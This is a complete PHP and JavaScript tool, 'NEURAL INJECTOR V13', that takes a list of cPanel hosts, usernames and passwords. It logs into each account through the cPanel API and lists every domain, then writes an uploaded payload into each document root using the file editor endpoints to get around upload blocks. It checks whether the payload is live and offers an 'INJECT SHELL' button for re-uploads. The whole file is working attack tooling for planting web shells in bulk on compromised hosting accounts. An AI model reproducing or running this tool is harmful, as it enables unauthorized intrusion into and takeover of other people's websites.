<?php
/*
 * NEURAL INJECTOR V13.0 - PRO INTERFACE
 * Fix: Write Mode (Anti-Upload Block) retained.
 * Feature: Re-upload capability after success + Cyber UI Redesign.
 */

error_reporting(0);
ini_set('display_errors', 0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '512M');

$USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/122.0.0.0 Safari/537.36"
];

function get_random_ua() { global $USER_AGENTS; return $USER_AGENTS[array_rand($USER_AGENTS)]; }

if (isset($_POST['action'])) {
    header('Content-Type: application/json');

    function clean_url($url) {
        $url = preg_replace('#^https?://#', '', $url);
        $url = preg_replace('#:\d+$#', '', $url);
        return rtrim($url, '/');
    }

    // STEALTH CURL
    function stealth_curl($url, $postData = null, $auth = null) {
        $ch = curl_init();
        $cookie_file = tempnam(sys_get_temp_dir(), 'cookie_');
        $headers = ["User-Agent: " . get_random_ua(), "Connection: keep-alive"];

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);

        if ($auth) {
            curl_setopt($ch, CURLOPT_USERPWD, $auth);
            curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
        }

        if ($postData) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        }

        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $res = curl_exec($ch);
        curl_close($ch);
        @unlink($cookie_file);
        return json_decode($res, true) ?: $res;
    }

    // DEPLOY VIA EDITOR (ANTI-UPLOAD BLOCK)
    function deploy_via_editor($host, $user, $pass, $dir, $filename, $content) {
        $auth = "$user:$pass";
        // 1. Mkfile
        stealth_curl("https://{$host}:2083/execute/Fileman/mkfile", ['dir' => $dir, 'filename' => $filename], $auth);
        // 2. Save Content
        return stealth_curl("https://{$host}:2083/execute/Fileman/save_file_content", [
            'dir' => $dir, 'file' => $filename, 'content' => $content, 'from_charset' => 'utf-8'
        ], $auth);
    }

    // ACTION 1: PROCESS
    if ($_POST['action'] === 'process_account') {
        $host = clean_url($_POST['host']);
        $user = $_POST['user'];
        $pass = $_POST['pass'];
        $file_name = $_POST['file_name'];
        $file_data = base64_decode($_POST['file_b64']);

        $api = stealth_curl("https://{$host}:2083/execute/DomainInfo/domains_data?format=json", null, "$user:$pass");

        $results = [];
        if (isset($api['status']) && $api['status'] === 1) {
            $domains = [];
            foreach (['main_domain', 'addon_domains'] as $k) {
                if (isset($api['data'][$k])) {
                    $d_list = isset($api['data'][$k]['domain']) ? [$api['data'][$k]] : $api['data'][$k];
                    foreach ($d_list as $d) if(isset($d['domain'])) $domains[] = ['d'=>$d['domain'], 'p'=>$d['documentroot']];
                }
            }

            foreach ($domains as $dm) {
                deploy_via_editor($host, $user, $pass, $dm['p'], $file_name, $file_data);

                $status_code = 'DEAD'; 
                foreach (["https://", "http://"] as $proto) {
                    $check = stealth_curl($proto . $dm['d'] . '/' . $file_name);
                    if (is_string($check)) {
                        if (strpos($check, "Status Instalasi (5-Layer Fallback)") !== false) {
                            $status_code = 'SUCCESS'; break;
                        } elseif (strpos($check, "Config 404") !== false) {
                            $status_code = 'PARTIAL'; break;
                        }
                    }
                }

                if ($status_code !== 'DEAD') {
                    $safe_creds = base64_encode("$host|$user|$pass");
                    $results[] = [
                        'domain' => $dm['d'], 'path' => $dm['p'],
                        'status' => $status_code, 'creds_enc' => $safe_creds 
                    ];
                }
            }
            echo json_encode(['status' => 'success', 'group_info' => ['h'=>$host, 'u'=>$user], 'results' => $results]);
        } else {
            echo json_encode(['status' => 'error']);
        }
        exit;
    }

    // ACTION 2: MANUAL RESCUE (WRITE MODE)
    if ($_POST['action'] === 'manual_upload') {
        $creds = explode('|', base64_decode($_POST['creds']));
        $filename = $_FILES['file']['name'];
        $content = file_get_contents($_FILES['file']['tmp_name']);
        
        $res = deploy_via_editor($creds[0], $creds[1], $creds[2], $_POST['path'], $filename, $content);

        if(isset($res['status']) && $res['status'] === 1) {
            echo json_encode(['status'=>'success', 'url' => "http://" . $_POST['domain'] . "/" . $filename]);
        } else {
            $msg = isset($res['errors']) ? implode(" | ", $res['errors']) : 'Write Error';
            echo json_encode(['status'=>'error', 'msg' => $msg]);
        }
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEURAL PRO V13</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
        
        body { background-color: #09090b; color: #e4e4e7; font-family: 'JetBrains Mono', monospace; overflow: hidden; }
        .sidebar { background: #18181b; border-right: 1px solid #27272a; }
        .glass-panel { background: #27272a; border: 1px solid #3f3f46; }
        
        /* Buttons */
        .btn-cyber { background: #2563eb; color: #fff; padding: 12px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; transition: 0.2s; border: 1px solid #3b82f6; }
        .btn-cyber:hover { background: #1d4ed8; box-shadow: 0 0 15px rgba(37, 99, 235, 0.4); }
        .btn-cyber:disabled { background: #3f3f46; border-color: #52525b; cursor: not-allowed; box-shadow: none; }

        /* Action Buttons */
        .act-btn { display: inline-flex; items-center; justify-content: center; padding: 6px 12px; border-radius: 4px; font-size: 10px; font-weight: bold; text-decoration: none; transition: all 0.2s; gap: 6px; }
        
        .act-rescue { background: rgba(234, 179, 8, 0.1); border: 1px solid #ca8a04; color: #facc15; cursor: pointer; }
        .act-rescue:hover { background: #ca8a04; color: #000; box-shadow: 0 0 10px rgba(234, 179, 8, 0.4); }
        
        .act-success { background: rgba(34, 197, 94, 0.1); border: 1px solid #16a34a; color: #4ade80; }
        .act-success:hover { background: #16a34a; color: #fff; box-shadow: 0 0 10px rgba(34, 197, 94, 0.4); }

        .act-retry { background: #27272a; border: 1px solid #52525b; color: #a1a1aa; cursor: pointer; width: 28px; height: 28px; padding: 0; display: inline-flex; align-items: center; justify-content: center; border-radius: 4px; }
        .act-retry:hover { border-color: #fff; color: #fff; }

        .hidden-file { display: none; }
        .upload-zone { border: 1px dashed #52525b; padding: 15px; text-align: center; border-radius: 6px; cursor: pointer; transition: 0.2s; color: #a1a1aa; font-size: 11px; }
        .upload-zone:hover { border-color: #3b82f6; color: #3b82f6; background: rgba(59, 130, 246, 0.05); }

        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #09090b; }
        ::-webkit-scrollbar-thumb { background: #3f3f46; border-radius: 2px; }
    </style>
</head>
<body class="h-screen flex">

    <div class="sidebar w-80 h-full flex flex-col p-6 gap-5 shadow-2xl z-10">
        <div>
            <h1 class="text-xl font-bold tracking-tighter text-white">NEURAL<span class="text-blue-500">PRO</span> <span class="text-xs text-gray-500">V13</span></h1>
            <p class="text-[10px] text-gray-500 mt-1">WRITE-MODE ENGINE</p>
        </div>

        <div class="flex flex-col gap-4 flex-1">
            <div>
                <label class="text-[10px] font-bold text-gray-400 uppercase mb-2 block">1. Target List</label>
                <label class="upload-zone" id="lblList"><i class="fa fa-file-text mb-1"></i><br>SELECT LIST.TXT<input type="file" id="listInput" class="hidden-file"></label>
            </div>
            <div>
                <label class="text-[10px] font-bold text-gray-400 uppercase mb-2 block">2. Payload</label>
                <label class="upload-zone" id="lblPayload"><i class="fa fa-code mb-1"></i><br>SELECT INC.PHP<input type="file" id="payloadInput" class="hidden-file"></label>
            </div>

            <div class="glass-panel p-4 rounded mt-2">
                <div class="flex justify-between text-[10px] mb-2 text-gray-400"><span>PROGRESS</span><span id="progText">0/0</span></div>
                <div class="w-full bg-gray-900 h-1.5 rounded-full overflow-hidden mb-4">
                    <div id="progBar" class="bg-blue-600 h-full w-0 transition-all duration-300"></div>
                </div>
                <div class="grid grid-cols-2 gap-2">
                    <div class="bg-black/40 p-2 rounded text-center border border-white/5">
                        <div class="text-[9px] text-gray-500">VERIFIED</div>
                        <div id="cntSuccess" class="text-lg font-bold text-green-500">0</div>
                    </div>
                    <div class="bg-black/40 p-2 rounded text-center border border-white/5">
                        <div class="text-[9px] text-gray-500">PARTIAL</div>
                        <div id="cntPartial" class="text-lg font-bold text-yellow-500">0</div>
                    </div>
                </div>
            </div>
        </div>
        <button onclick="startEngine()" id="btnStart" class="btn-cyber rounded"><i class="fa fa-bolt mr-2"></i>START SYSTEM</button>
    </div>

    <div class="flex-1 flex flex-col bg-[#09090b] relative">
        <div class="h-14 border-b border-[#27272a] flex items-center px-6 justify-between bg-[#09090b]">
            <div class="text-xs text-gray-400 font-bold"><i class="fa fa-terminal text-blue-500 mr-2"></i> LIVE OPERATION FEED</div>
        </div>

        <div class="flex-1 overflow-y-auto">
            <table class="w-full text-left text-xs">
                <thead class="sticky top-0 bg-[#09090b] text-gray-500 border-b border-[#27272a] z-10">
                    <tr>
                        <th class="py-3 px-6 w-1/2">DOMAIN TARGET</th>
                        <th class="py-3 px-4 w-1/6">INTEGRITY</th>
                        <th class="py-3 px-4 w-1/3 text-right">CONTROLS</th>
                    </tr>
                </thead>
                <tbody id="resBody" class="divide-y divide-[#27272a]"></tbody>
            </table>
            <div id="emptyState" class="absolute inset-0 flex flex-col items-center justify-center opacity-10 pointer-events-none">
                <i class="fa fa-microchip text-6xl text-white mb-4"></i>
                <span class="text-sm tracking-widest font-bold">AWAITING INPUT</span>
            </div>
        </div>
    </div>

<script>
    let targets = [], payload = { n: '', d: '' };
    const el = (id) => document.getElementById(id);

    el('listInput').onchange = (e) => {
        if(!e.target.files[0]) return;
        el('lblList').innerHTML = `<i class="fa fa-check text-green-500"></i> ${e.target.files[0].name}`;
        el('lblList').style.borderColor = '#22c55e';
        const fr = new FileReader();
        fr.onload = (x) => {
            targets = x.target.result.split(/\r?\n/).map(l => {
                const p = l.split('#'); return (p.length >= 3) ? { h:p[0].trim(), u:p[1].trim(), p:p[2].trim() } : null;
            }).filter(a => a);
            el('progText').innerText = `0 / ${targets.length}`;
        };
        fr.readAsText(e.target.files[0]);
    };

    el('payloadInput').onchange = (e) => {
        if(!e.target.files[0]) return;
        el('lblPayload').innerHTML = `<i class="fa fa-check text-green-500"></i> ${e.target.files[0].name}`;
        el('lblPayload').style.borderColor = '#22c55e';
        const fr = new FileReader();
        fr.onload = (x) => { payload.n = e.target.files[0].name; payload.d = x.target.result.split(',')[1]; };
        fr.readAsDataURL(e.target.files[0]);
    };

    async function startEngine() {
        if(!targets.length || !payload.d) return alert("Missing Resources");
        el('emptyState').style.display = 'none';
        el('btnStart').disabled = true;
        el('btnStart').innerHTML = `<i class="fa fa-circle-notch fa-spin mr-2"></i> PROCESSING...`;

        let stats = { s: 0, p: 0 };
        
        for (let i = 0; i < targets.length; i++) {
            const t = targets[i];
            el('progText').innerText = `${i+1} / ${targets.length}`;
            el('progBar').style.width = `${((i+1)/targets.length)*100}%`;

            const fd = new FormData();
            fd.append('action', 'process_account');
            fd.append('host', t.h); fd.append('user', t.u); fd.append('pass', t.p);
            fd.append('file_name', payload.n); fd.append('file_b64', payload.d);

            try {
                const req = await fetch('', { method: 'POST', body: fd });
                const res = await req.json();

                if (res.status === 'success' && res.results.length > 0) {
                    renderGroup(res.group_info, res.results);
                    res.results.forEach(r => {
                        if(r.status === 'SUCCESS') stats.s++; else stats.p++;
                    });
                    el('cntSuccess').innerText = stats.s; el('cntPartial').innerText = stats.p;
                }
            } catch (e) {}
        }
        el('btnStart').innerHTML = `<i class="fa fa-check mr-2"></i> FINISHED`;
    }

    function renderGroup(info, domains) {
        const tbody = el('resBody');
        const header = `
            <tr class="bg-[#18181b] border-l-4 border-blue-600">
                <td colspan="3" class="py-2 px-6">
                    <div class="flex items-center gap-4 text-[10px] text-gray-400">
                        <i class="fa fa-server text-blue-500"></i>
                        <span>HOST: <b class="text-gray-200">${info.h}</b></span>
                        <span>USER: <b class="text-gray-200">${info.u}</b></span>
                    </div>
                </td>
            </tr>
        `;
        tbody.insertAdjacentHTML('beforeend', header);

        domains.forEach(d => {
            let statusBadge, actionUI;

            if (d.status === 'SUCCESS') {
                statusBadge = `<span class="text-green-500 font-bold text-[10px]"><i class="fa fa-shield-alt mr-1"></i> VERIFIED</span>`;
                actionUI = `<a href="http://${d.domain}/error_log.php" target="_blank" class="act-btn act-success"><i class="fa fa-external-link-alt"></i> OPEN LOG</a>`;
            } else {
                statusBadge = `<span class="text-yellow-500 font-bold text-[10px]"><i class="fa fa-exclamation-triangle mr-1"></i> CONFIG 404</span>`;
                // Generate Unique ID
                const uid = 'act_' + Math.random().toString(36).substr(2, 9);
                // Action UI: Label Trigger for Upload
                actionUI = `
                    <div id="${uid}" class="flex justify-end">
                        <label class="act-btn act-rescue">
                            <i class="fa fa-upload"></i> INJECT SHELL
                            <input type="file" class="hidden-file" onchange="manualRescue(this, '${uid}', '${d.domain}', '${d.path}', '${d.creds_enc}')">
                        </label>
                    </div>
                `;
            }

            const row = `
                <tr class="hover:bg-white/5 transition">
                    <td class="py-2 px-6 pl-10 text-gray-400 border-l border-[#27272a]">
                        <i class="fa fa-level-up-alt fa-rotate-90 mr-2 text-gray-600"></i> ${d.domain}
                    </td>
                    <td class="py-2 px-4">${statusBadge}</td>
                    <td class="py-2 px-4 text-right">${actionUI}</td>
                </tr>
            `;
            tbody.insertAdjacentHTML('beforeend', row);
        });
        const cont = document.querySelector('.overflow-y-auto');
        cont.scrollTop = cont.scrollHeight;
    }

    async function manualRescue(input, uid, domain, path, credsEnc) {
        if (!input.files[0]) return;
        const box = el(uid);
        // Loading State
        box.innerHTML = `<span class="text-yellow-500 text-[10px] font-bold animate-pulse"><i class="fa fa-cog fa-spin mr-1"></i> WRITING...</span>`;

        const fd = new FormData();
        fd.append('action', 'manual_upload');
        fd.append('creds', credsEnc); fd.append('domain', domain);
        fd.append('path', path); fd.append('file', input.files[0]);

        try {
            const req = await fetch('', { method: 'POST', body: fd });
            const res = await req.json();

            if (res.status === 'success') {
                // SUCCESS STATE: Link + Re-upload Button
                box.innerHTML = `
                    <div class="flex gap-2">
                        <a href="${res.url}" target="_blank" class="act-btn act-success"><i class="fa fa-external-link-alt"></i> OPEN</a>
                        <label class="act-retry" title="Upload Again / Replace">
                            <i class="fa fa-sync-alt text-[10px]"></i>
                            <input type="file" class="hidden-file" onchange="manualRescue(this, '${uid}', '${domain}', '${path}', '${credsEnc}')">
                        </label>
                    </div>
                `;
            } else {
                box.innerHTML = `<span class="text-red-500 text-[10px] font-bold"><i class="fa fa-times"></i> ERROR</span>`;
                setTimeout(() => {
                    // Restore Upload Button on Fail
                    box.innerHTML = `
                        <label class="act-btn act-rescue border-red-500 text-red-500">
                            <i class="fa fa-redo"></i> RETRY
                            <input type="file" class="hidden-file" onchange="manualRescue(this, '${uid}', '${domain}', '${path}', '${credsEnc}')">
                        </label>`;
                }, 2000);
            }
        } catch (e) { box.innerHTML = `<span class="text-red-500">NET ERR</span>`; }
    }
</script>
</body>
</html>
